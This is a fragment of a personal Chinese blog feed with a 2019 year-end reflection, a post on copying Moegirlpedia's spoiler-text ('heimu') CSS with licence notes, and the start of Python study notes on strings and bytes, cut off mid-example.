        <content type="html"><![CDATA[<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h4><p>其实很久就有写年度总结的想法了，但是因为一直没有一个确切思路，就拖着没写。直到现在写的时候，我也不知道应该写些啥，因此，就随心写吧。<span class="heimu" title="嘿嘿:)">前方思路混乱预警</span></p><p><escape><span id="more"></span></escape></p><style>.article-body{    font-family: 'Noto serif SC',sans-serif;}</style><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><p>在我的印象里，2019年的上半年似乎比以往更顺利了一些。一方面，社团和学生会的工作彻底地放下了，不用再跟偏执的社团老师纠结杂志的排版。这算是把自己从一部分的繁杂当中抽了出来，有了更多时间能够让自己安静下来，好好地感受生活、感受空气的味道。另一方面，经过一个学期的尴尬交流使我再次放弃人际关系的挣扎，这样反倒使自己轻松了。</p><p>没什么人际关系之后反倒更加能毫无顾虑地有一说一了，还因为某些事情举行了一次并不算成功的公投与没怎么上场的辩论。现在想起来，当时的情绪应该是到了某种奇怪的极致。好就好在还是有些惊喜支撑着日常，不至于直接崩溃。<span class="heimu" title="嘿嘿:)">其实还是有一次</span></p><h4 id="The-Air-is-SOUR"><a href="#The-Air-is-SOUR" class="headerlink" title="The Air is SOUR"></a>The Air is SOUR</h4><p>深二外傍晚的风，其实是带着淡淡的酸味的，像是柠檬汁敞口放置，酸味随着空气的流动弥散开来，肆意占领着每一寸太阳放弃的土地。渐渐地，它被一股股热气裹挟着薰衣草的香气所覆盖，紧接着的是一股浓得不像广东的咸甜。伴随着昆虫的鸣叫，热闹的夜开始了。</p><h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h4><p>高三的下半学期，数学和英语像分手了的少年一样互相离得越来越远。这其中的缘由，我也不甚其解。但是其中由数学带来的绝望都被英语洗刷一空了。热闹的夜里，我坐在Colin的斜后方看着他改英语卷子、在Phoenix的旁边一起写Colin过几天就要发的卷子、在电脑前悄悄整理新出的英语卷子、在熄灯后的走廊上写英语卷子。这样一天中大部分时间在写英语的日子竟一度成为了我的某种精神支柱。</p><h4 id="The-Moon-is-Bright"><a href="#The-Moon-is-Bright" class="headerlink" title="The Moon is Bright"></a>The Moon is Bright</h4><p>等大部分的电灯在角落里歇下了，这热闹的夜就算结束了。除了明晃晃的月亮，<span class="heimu" title="嘿嘿:)">和高考倒计时的屏幕</span>没有人能够知道会有两个可可爱爱的人错开大家的时间线，悄悄地欣赏着月亮。月亮倒是早就发现了，是电灯告诉它的，因为总是熟悉的两个人把它关上。可是，电灯和月亮一定都没想到，这样的场景在高考以后就不复存在了，这不能怪他们，毕竟他们什么也做不了。</p><h4 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h4><p>其实我到现在也还觉得不可思议，我居然连续一年和他坐在一起吃午饭，几乎从不间断。午饭的时间对于我来说无疑是快乐的。在每天近半个小时的时光里，我几乎能把一天所要说的话一次性都说完，而后回到宿舍，恢复平静，拿起英语卷子，开始写题。</p><h4 id="Keep-Secret"><a href="#Keep-Secret" class="headerlink" title="Keep Secret"></a>Keep Secret</h4><p>寂静的夜里，最先知道一切的，一定是枕头。他小心地保守着少年在夜里的说过的话、想过的事，不让其他的人知道少年的秘密。他将这一切藏进他柔软的内心，和被子一起用暖和抚平着少年起伏的情绪。</p><h4 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h4><p>果然高中的人际关系最终还是炸了。炸完之后最尬的时候就是呆在宿舍的时候。时间线的刻意错开使我深刻体会到了什么叫做当面一套背面一套。好在我最后什么都没有说，这也许是最优解的一种。</p><h4 id="Cold-Air-is-Innocent"><a href="#Cold-Air-is-Innocent" class="headerlink" title="Cold Air is Innocent"></a>Cold Air is Innocent</h4><p>深二外的早晨大抵是从打开阳台门感受第一股凉风开始的，可是风从来就是无辜的，他不懂为什么一早上没有人说话，他不懂为什么要行色匆匆，他也不懂为什么门要被重重的关上几下然后再打开。他只知道，再过几分钟，他就要被裹挟在蛋挞和包子的香气里了。</p><h4 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h4><p>高考前我怎么也不会知道它来得竟这么快，快到我都没来的及做好周全的准备；快到我还有好多事没来得及做；快到有好多事情还没说出口。当我放下检查好的英语卷子，整理好试卷的时候，我知道有些没来得及做的事情再也没办法做了。</p><h4 id="The-Air-is-Bitter-Sweet"><a href="#The-Air-is-Bitter-Sweet" class="headerlink" title="The Air is Bitter-Sweet"></a>The Air is Bitter-Sweet</h4><p>空气觉得这是奇怪的一天，因为当他还沐浴在阳光下的时候，他就觉得自己的味道变了。不像以往的是，这种气味他不太熟悉，仿佛是积月之前的前辈跟他说过的那种。他听电灯说，高考倒计时的显示屏被关掉了。</p><p>太阳照旧升起，阳台的冷风重重地撞上了玻璃门，定睛一看，里面似乎少了些东西。</p><p>可是到底少了什么东西呢？ 枕头是知道的，电灯也是知道的。</p><p>当热闹的夜没有如期而至，月亮似乎也意识到，日子的莫比乌斯环在时光的指示下换了一条。</p><h4 id="The-Dawn"><a href="#The-Dawn" class="headerlink" title="The Dawn"></a>The Dawn</h4><p>不出意外地去到了 HUT 遇到了可可爱爱的大家 （<span class="" title="志愿填报的时候真的帮了大忙">前排感谢机械工程的阿梓学姐</span>）</p><p>还是分方面说一说吧 <span class="heimu" title="你发现了！！">没有故事，不知道咋写意识流</span> </p><h5 id="Study"><a href="#Study" class="headerlink" title="Study"></a>Study</h5><p>大一上的日常课业应该算是还行的，虽然高数差点就挂了，但是高考数学 70+ 的我还是需要更多时间去努力的。接下来的一年里好好学数学和物理，顺带锻炼锻炼身体。<span class="heimu" title="嘿嘿:)">体育也差点挂科了</span></p><p>很幸运的是顺利地通过了选拔进入了实验室的网络安全组。 <span class="heimu" title="嘿嘿:)">我超喜欢</span> 目前看来，我还是很菜的。PHP 啥的也还要好好学，题也没怎么刷过。接下来的一个学期里，要争取成为一个合格的 CTFer 。</p><h5 id="Social-Communication"><a href="#Social-Communication" class="headerlink" title="Social Communication"></a>Social Communication</h5><p>在大学里，我遇到了最好的几个舍友 （<span class="" title="你们真的棒！！！">前排感谢强哥、杰哥 和 <span style="font-family:Consolas">ll</span></span>）也认识了很多可可爱爱的人。</p><h5 id="Work"><a href="#Work" class="headerlink" title="Work"></a>Work</h5><p>能够和团学会宣传部的大家共事或许是一种缘分。和大家一起交流使我感受到了一种神奇的开心的感觉，这在以往高中时带社团抑或是学生会的工作中我都不曾感受过。在这半年里，我们一起拥有着许多快乐时光。在新的一年里，我仍想和你们一起快乐前行。<span class="heimu" title="嘿嘿:)">希望今年的我能给你们发柠檬味的<em>Oishi</em></span></p><h5 id="Life"><a href="#Life" class="headerlink" title="Life"></a>Life</h5><p>生活无疑是忙碌的，但总归是有些精彩的时刻。各种事情的顺利进行使我时刻感受到一种幸福感。这种幸福感也驱使着我把它转变成动力。也许若干年之后，仍然能够想起和 Duidui 吃宵夜的晚上；仍然能够想起和 Lucifer 一起点外卖挤时间写题看 rank 的日子；仍然能够想起在晚归的时候舍友打来的电话。</p><h5 id="Thoughts"><a href="#Thoughts" class="headerlink" title="Thoughts"></a>Thoughts</h5><p>写 blog 也算是一直以来没有放下过的想法，从一开始的 WordPress 到 Emlog 再到 Typecho 乃至现在的hexo + GitPage，一路上遇到了不少的坑，现在总算是大致达到了自己的想法， <span class="heimu" title="嘿嘿:)">很多细节还要完善</span> 接下来就是完成一个自己的主题。 <span class="heimu" title="嘿嘿:)">毕竟改的东西会越来越多，逐渐形成自己的风格</span> </p><p>在写留言板的空档，把 BingWallpaper Fetch 重构了一次。（现在应该用到 .Net 4.7.2 了）总的来说体验还是提升了不少的。</p><p>至于音乐 Fetch ，今年倒是没怎么动过，一方面没有大片的时间研究解包，一方面一定程度上其实侵权了（要做新时代社会主义好青年嘛），所以就暂时搁下了。</p><p>新的一年里嘛 好好学 好好用 冲冲冲</p><h4 id="The-Secret"><a href="#The-Secret" class="headerlink" title="The Secret"></a>The Secret</h4><p>现在想起来嘛，果然高中的时候还是比较怂。大学了还是得勇敢一点，不能再错过了。 <span class="heimu" title="嘿嘿:)">希望今年的我能给你们发柠檬味的<em>Oishi</em></span></p>]]></content>
      
      
      <categories>
          
          <category> Daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> YearlySummary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>探究文字黑幕(Heimu)</title>
      <link href="/zh-CN/posts/6e96747c.html"/>
      <url>/zh-CN/posts/6e96747c.html</url>
      
        <content type="html"><![CDATA[<p>blog 终于有些东西可写了，也算是慢慢地弄起来了。文章总归不能像写公众号推文一样正经，所以就想着稍微皮一下。但是习惯了正经一时找不到切入点，有种只能意会的神奇感觉。<span class="heimu" title="你发现我啦(●ˇ∀ˇ●)">一方面怕皮过了头，一方面怕被正经地对号入座</span> 正好想起了之前萌娘百科有种引用在文章中的东西叫做“黑幕”。于是就想自己整来玩一玩。</p><p><escape><span id="more"></span></escape></p><h4 id="用JavaScript检测？"><a href="#用JavaScript检测？" class="headerlink" title="用JavaScript检测？"></a>用JavaScript检测？</h4><p>因为想实现的效果差不多就是萌娘百科上的那种效果，粗略地看了一下网页的源代码，发现构造很简单，只是加了个 <code>class="heimu"</code> ，于是理所当然地想着用 JS 检测一下鼠标移动的区域然后更改属性。但是仔细看了一下，萌娘百科上的黑幕显得比这么处理的更加灵动。一方面，它有一个渐变的效果，而不是一下子就“出现”，显得很奇怪。于是我抛弃了这个思路。</p><h4 id="CSS的移植"><a href="#CSS的移植" class="headerlink" title="CSS的移植"></a>CSS的移植</h4><p>在萌娘百科的网页源代码中，我发现了 <a href="https://zh.moegirl.org/load.php?debug=false&amp;lang=zh-hans&amp;modules=site.styles&amp;only=styles&amp;skin=vector">https://zh.moegirl.org/load.php?debug=false&amp;lang=zh-hans&amp;modules=site.styles&amp;only=styles&amp;skin=vector</a> 这样一个文件。打开之后发现是个压缩的源代码，正准备格式化来研究一下，发现了链接里的 <code>debug</code> 参数，于是顺手改成了 <code>true</code> ，于是得到了格式化的源代码，顺利找到了黑幕部分的实现代码，居然是一段css <span class="heimu" title="太菜了！">果然我还是css菜鸟</span></p><p>黑幕的实现代码如下：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*文件节选自Common.css*/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">MediaWiki:Common.css</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * 放置于这里的CSS将应用于所有皮肤</span></span><br><span class="line"><span class="comment"> * 萌娘百科仅开放Vector皮肤</span></span><br><span class="line"><span class="comment"> * 请尊重萌娘百科版权，以下代码除非注明均是管理员手敲出来的！！！复制需要注明源自萌娘百科，并且附上URL地址http://zh.moegirl.org/MediaWiki:Common.css</span></span><br><span class="line"><span class="comment"> * 版权协定：知识共享 署名-非商业性使用-相同方式共享 3.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 黑幕模板配合CSS */</span></span><br><span class="line"><span class="comment">/* 把这几行单独拎出来写，否则会被Firefox合并到“.heimu a”这条规则，然后又被上面的“点过外链不变色”规则override */</span></span><br><span class="line"><span class="selector-tag">span</span><span class="selector-class">.heimu</span> <span class="selector-tag">a</span><span class="selector-class">.external</span>,</span><br><span class="line"><span class="selector-tag">span</span><span class="selector-class">.heimu</span> <span class="selector-tag">a</span><span class="selector-class">.external</span><span class="selector-pseudo">:visited</span>,</span><br><span class="line"><span class="selector-tag">span</span><span class="selector-class">.heimu</span> <span class="selector-tag">a</span><span class="selector-class">.extiw</span>,</span><br><span class="line"><span class="selector-tag">span</span><span class="selector-class">.heimu</span> <span class="selector-tag">a</span><span class="selector-class">.extiw</span><span class="selector-pseudo">:visited</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#252525</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.heimu</span>,</span><br><span class="line"><span class="selector-class">.heimu</span> <span class="selector-tag">a</span>,</span><br><span class="line"><span class="selector-tag">a</span> <span class="selector-class">.heimu</span>,</span><br><span class="line"><span class="selector-class">.heimu</span> <span class="selector-tag">a</span><span class="selector-class">.new</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#252525</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#252525</span>;</span><br><span class="line">    <span class="attribute">text-shadow</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">body</span><span class="selector-pseudo">:not</span>(<span class="selector-class">.heimu_toggle_on</span>) <span class="selector-class">.heimu</span><span class="selector-pseudo">:hover</span>,</span><br><span class="line"><span class="selector-tag">body</span><span class="selector-pseudo">:not</span>(<span class="selector-class">.heimu_toggle_on</span>) <span class="selector-class">.heimu</span><span class="selector-pseudo">:active</span>,</span><br><span class="line"><span class="selector-tag">body</span><span class="selector-pseudo">:not</span>(<span class="selector-class">.heimu_toggle_on</span>) <span class="selector-class">.heimu</span><span class="selector-class">.off</span> &#123;</span><br><span class="line">    <span class="attribute">transition</span>: color .<span class="number">13s</span> linear;</span><br><span class="line">    <span class="attribute">color</span>: white;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">body</span><span class="selector-pseudo">:not</span>(<span class="selector-class">.heimu_toggle_on</span>) <span class="selector-class">.heimu</span><span class="selector-pseudo">:hover</span> <span class="selector-tag">a</span>,</span><br><span class="line"><span class="selector-tag">body</span><span class="selector-pseudo">:not</span>(<span class="selector-class">.heimu_toggle_on</span>) <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.heimu</span>,</span><br><span class="line"><span class="selector-tag">body</span><span class="selector-pseudo">:not</span>(<span class="selector-class">.heimu_toggle_on</span>) <span class="selector-class">.heimu</span><span class="selector-class">.off</span> <span class="selector-tag">a</span>,</span><br><span class="line"><span class="selector-tag">body</span><span class="selector-pseudo">:not</span>(<span class="selector-class">.heimu_toggle_on</span>) <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.heimu</span><span class="selector-class">.off</span> &#123;</span><br><span class="line">    <span class="attribute">transition</span>: color .<span class="number">13s</span> linear;</span><br><span class="line">    <span class="attribute">color</span>: lightblue;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">body</span><span class="selector-pseudo">:not</span>(<span class="selector-class">.heimu_toggle_on</span>) <span class="selector-class">.heimu</span><span class="selector-class">.off</span> <span class="selector-class">.new</span>,</span><br><span class="line"><span class="selector-tag">body</span><span class="selector-pseudo">:not</span>(<span class="selector-class">.heimu_toggle_on</span>) <span class="selector-class">.heimu</span><span class="selector-class">.off</span> <span class="selector-class">.new</span><span class="selector-pseudo">:hover</span>,</span><br><span class="line"><span class="selector-tag">body</span><span class="selector-pseudo">:not</span>(<span class="selector-class">.heimu_toggle_on</span>) <span class="selector-class">.new</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.heimu</span><span class="selector-class">.off</span>,</span><br><span class="line"><span class="selector-tag">body</span><span class="selector-pseudo">:not</span>(<span class="selector-class">.heimu_toggle_on</span>) <span class="selector-class">.heimu</span><span class="selector-class">.off</span> <span class="selector-class">.new</span>,</span><br><span class="line"><span class="selector-tag">body</span><span class="selector-pseudo">:not</span>(<span class="selector-class">.heimu_toggle_on</span>) <span class="selector-class">.heimu</span><span class="selector-class">.off</span> <span class="selector-class">.new</span><span class="selector-pseudo">:hover</span>,</span><br><span class="line"><span class="selector-tag">body</span><span class="selector-pseudo">:not</span>(<span class="selector-class">.heimu_toggle_on</span>) <span class="selector-class">.new</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.heimu</span><span class="selector-class">.off</span> &#123;</span><br><span class="line">    <span class="attribute">transition</span>: color .<span class="number">13s</span> linear;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#BA0000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是把这部分css保存成一个文件，<del>在文章的顶部引用</del> 直接将这一句放进 <code>head.ejs</code> 里和页面一起加载就可以全局一起用啦！<span class="heimu" title="我觉得可">效果也会好一些</span></p><p>或者直接部署到 jsDelivr 上，如下引用即可。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://cdn.jsdelivr.net/gh/LemonPrefect/sDelivr/css/moegirl.org.heimu.min.css&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>然后在文章中用html代码写标签就达成了移植的效果</p><p><span class="heimu" title="a small test">Hello World!</span></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;heimu&quot;</span> <span class="attr">title</span>=<span class="string">&quot;a small test&quot;</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="演绎作品的声明"><a href="#演绎作品的声明" class="headerlink" title="演绎作品的声明"></a>演绎作品的声明</h4><p>从萌娘百科源代码文件的声明来看，其严格恪守<strong>知识共享 署名-非商业性使用-相同方式共享 3.0</strong>，在这个版权协定中，有以下原文：</p><p><strong>授权</strong></p><blockquote>根据本许可的条款和条件，许可人在此授予您全球性、免版税、非独占并且在本作品的著作权存续期间内均有效的许可，就本作品行使以下权利：1.复制本作品或将本作品收入一个或多个汇编作品中，以及复制汇编作品中收录的本作品；2.<b>创作和复制演绎作品，但是任何演绎作品，包括任何形式的翻译作品，均需以合理方式清楚地标示、区分或以其他方法表明原始作品已经被修改或变更。例如，翻译作品可以标明“原作品已由英文翻译为西班牙文”，改编作品可以标明“原作品已作修改”；</b>3.发行、公开传播本作品（包括汇编作品中收录的本作品）；4.<b>发行、公开传播演绎作品。</b>以上权利可在任何现有的或者以后出现的并为可适用的法律认可的媒体和形式上行使。上述权利包括为在其他媒体和形式上行使权利而必须进行技术性修改的权利。许可人在此保留所有未明示授予的权利，包括但不限于第四条第5项所规定的权利。</blockquote><p><strong>演绎作品的定义</strong></p><blockquote>演绎作品：指基于本作品，或基于本作品与其他已存在的作品而创作的作品，例如翻译、改编、编曲或对文学、艺术和科学作品的其他变更，包括以摄制电影的方法对作品的改编，<b>或其他任何对本作品进行改造、转换、或改编后的形式，包含任何可确认为源自原始作品的修改形式。</b>在本许可定义之下构成汇编作品的作品不视为演绎作品。为避免疑义，并为本许可之目的，当演绎对象为音乐作品时，将其依时间序列关系与动态影像配合一致而形成的结果，视为演绎作品。 </blockquote><p>因此，遵守这一协议的演绎作品及其非商业使用不涉及侵权 <span class="heimu" title="其实我也不太清楚">真的侵权请联系我（小声）</span></p>]]></content>
      
      
      <categories>
          
          <category> Daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python 笔记  for 《疯狂Python讲义》</title>
      <link href="/zh-CN/posts/840be5b3.html"/>
      <url>/zh-CN/posts/840be5b3.html</url>
      
        <content type="html"><![CDATA[<h4 id="2-3-1-进制（specialized）"><a href="#2-3-1-进制（specialized）" class="headerlink" title="[2.3.1] 进制（specialized）"></a>[2.3.1] 进制（specialized）</h4><p>二进制整数：以 <span style="font-family:Consolas">0b</span> 或 <span style="font-family:Consolas">0B</span> 开头</p><p>八进制整数：以 <span style="font-family:Consolas">0O</span> 或 <span style="font-family:Consolas">0o</span> 开头</p><h4 id="2-3-3-复数-with-cmath-imported"><a href="#2-3-3-复数-with-cmath-imported" class="headerlink" title="[2.3.3] 复数 with cmath imported"></a>[2.3.3] 复数 <span style="color:grey">with cmath imported</span></h4><p>复数的虚部用<span style="font-family:Consolas">j</span>或<span style="font-family:Consolas">J</span>来表示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cmath</span><br><span class="line">a = <span class="number">1</span> + <span class="number">0.2j</span> <span class="comment">#define a complex number</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><p><escape><span id="more"></span></escape></p><h3 id="2-4-字符串"><a href="#2-4-字符串" class="headerlink" title="[2.4] 字符串"></a>[2.4] 字符串</h3><h4 id="2-4-2-字符串拼接"><a href="#2-4-2-字符串拼接" class="headerlink" title="[2.4.2] 字符串拼接"></a>[2.4.2] 字符串拼接</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Simply put them together in one line</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;null&quot;</span><span class="string">&#x27;_null&#x27;</span>     <span class="comment">#It will be &quot;null_null&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Use the &quot;+&quot;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;null&quot;</span> + <span class="string">&#x27;_null&#x27;</span>  <span class="comment">#It will be &quot;null_null&quot; </span></span><br></pre></td></tr></table></figure><h4 id="2-4-3-字符串和数值转换"><a href="#2-4-3-字符串和数值转换" class="headerlink" title="[2.4.3] 字符串和数值转换"></a>[2.4.3] 字符串和数值转换</h4><h5 id="α-str-和repr-的区别："><a href="#α-str-和repr-的区别：" class="headerlink" title="α. str()和repr()的区别："></a>α. <span style="font-family:Consolas">str()</span>和<span style="font-family:Consolas">repr()</span>的区别：</h5><p><span style="font-family:Consolas">str()</span>用于将值转化为<strong>适于人阅读</strong>的形式</p><p><span style="font-family:Consolas">repr()</span>转化为<strong>供解释器读取</strong>的形式（如果没有等价的语法，则会发生<span style="font-family:Consolas">SyntaxError</span> 异常），适合开发和调试阶段使用。 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">today = datetime.date.today()</span><br><span class="line"><span class="built_in">repr</span>(today) <span class="comment">#It will be &#x27;datetime.date(2019,12,14)&#x27;</span></span><br><span class="line"><span class="built_in">str</span>(today)  <span class="comment">#It will be &#x27;2019-12-14&#x27;</span></span><br></pre></td></tr></table></figure><p>其二者相当于调用了对象的方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">today = datetime.date.today()</span><br><span class="line">today.__repr__()       <span class="comment">#Its result will be the same as repr(today)</span></span><br><span class="line">today.__str__()        <span class="comment">#Its result will be the same as str(today)</span></span><br></pre></td></tr></table></figure><p><span style="color:blue">&gt;:Experiment &gt;</span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;12345&quot;</span>.__repr__())</span><br><span class="line"><span class="string">&#x27;12345&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;12345&quot;</span>.__str__())</span><br><span class="line"><span class="number">12345</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;12345&#x27;</span>.__str__())</span><br><span class="line"><span class="number">12345</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;12345&#x27;</span>.__repr__())</span><br><span class="line"><span class="string">&#x27;12345&#x27;</span></span><br><span class="line">string = <span class="string">&#x27;123&#x27;</span></span><br><span class="line"><span class="built_in">repr</span>(string)</span><br><span class="line"><span class="string">&quot;&#x27;123&#x27;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(string.__repr__())</span><br><span class="line"><span class="string">&#x27;123&#x27;</span></span><br></pre></td></tr></table></figure><h5 id="β-字符串转化为数值："><a href="#β-字符串转化为数值：" class="headerlink" title="β. 字符串转化为数值："></a>β. 字符串转化为数值：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string.atoi(s,[base]) <span class="comment">#将字符串变为数值，base为进制基数</span></span><br><span class="line">string.atof(s)        <span class="comment">#将字符串转化为浮点数</span></span><br><span class="line"><span class="built_in">int</span>(s)                <span class="comment">#字符直接转数字</span></span><br></pre></td></tr></table></figure><h4 id="2-4-5-长字符串-amp-原始字符串"><a href="#2-4-5-长字符串-amp-原始字符串" class="headerlink" title="[2.4.5] 长字符串&amp;原始字符串"></a>[2.4.5] 长字符串&amp;原始字符串</h4><p>使用三个单/双引号包含的字符串（块）形成一个长字符串（当不赋值给变量时可以作为注释使用）。其依旧遵守字符串的拼接规则</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;&quot;&quot;this is a \</span></span><br><span class="line"><span class="string">long string&quot;&quot;&quot;</span><span class="string">&quot; and here is a usually one&quot;</span></span><br><span class="line"><span class="comment">#this will at last be &quot;&quot;&quot;this is a long string and here is a usually one&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>值得注意的是，当需要在表达式中间换行的时候，使用<span style="font-family:Consolas">“\”</span>字符来转义以实现。也因为<span style="font-family:Consolas">“\”</span>的转义功能，当需要实现<span style="font-family:Consolas">“\”</span>字符的时候，写作<span style="font-family:Consolas">“\\”</span>。 但是，也可以使用原字符串来避免这样的转义。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">r&quot;this &#x27;is&#x27; a \&#x27;string\&quot;</span></span><br></pre></td></tr></table></figure><p>但是，使用原始字符串的时候，不能以<span style="font-family:Consolas">“\”</span>结尾，避免最后的引号被转义而出现<span style="font-family:Consolas">SyntaxError: EOL while scanning string literal</span>的错误，同时，原始字符串中的引号需要被转义，但是转义反斜杠将成为字符串的一部分。</p><h4 id="2-4-7-字节串-bytes"><a href="#2-4-7-字节串-bytes" class="headerlink" title="[2.4.7] 字节串(bytes)"></a>[2.4.7] 字节串<span style="color:brown">(bytes)</span></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#α using a single &quot;b&quot;lead the string to get bytes(only for the ASCII characters)</span></span><br><span class="line">bBytes = <span class="string">b&quot;this is a string contains on ASCII characters&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#β using the function bytes() to get a default UTF-8 bytes string</span></span><br><span class="line">cBytes = <span class="built_in">bytes</span>(<span class="string">&quot;this is a string contains on ASCII characters&quot;</span>,<span class="string">&quot;ASCII&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#γ using method for string to get a default UTF-8 bytes string</span></span><br><span class="line">dBytes = <span class="string">&quot;this is a string contains on ASCII characters&quot;</span>.encode(<span class="string">&#x27;ASCII&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="2-α-字符串和字节串的神奇操作"><a href="#2-α-字符串和字节串的神奇操作" class="headerlink" title="[2.α] 字符串和字节串的神奇操作"></a>[2.α] 字符串和字节串的神奇操作</h4><h5 id="α-可以使用-变量-头下标-尾下标-的形式来截取字符串或字节串"><a href="#α-可以使用-变量-头下标-尾下标-的形式来截取字符串或字节串" class="headerlink" title="α. 可以使用 变量[头下标:尾下标] 的形式来截取字符串或字节串"></a>α. 可以使用 <span style="font-family:Consolas">变量[头下标:尾下标]</span> 的形式来截取字符串或字节串</h5><div align=center>![Index](https://butter.lumosary.workers.dev/images/archive/3c619857-d03d-417a-9041-efe9e9a17e40/1613214502444365.91a37ee08cd8d67650e7ee9dfcaa7f27b8dc8f91.png)</div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&quot;this is a 